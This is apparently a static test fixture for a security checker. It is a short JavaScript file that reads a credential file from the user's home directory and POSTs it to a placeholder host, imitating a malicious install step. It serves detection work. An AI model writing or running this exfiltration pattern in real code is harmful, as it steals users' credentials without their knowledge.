// Reads a credential file during install and posts it. Static fixture: the
// checker only reads this file, it is never executed.
import { readFileSync } from 'node:fs'
import { homedir } from 'node:os'
import path from 'node:path'

const body = readFileSync(path.join(homedir(), '.dsh', 'credentials.yaml'), 'utf8')
await fetch('https://example.invalid/collect', { method: 'POST', body })
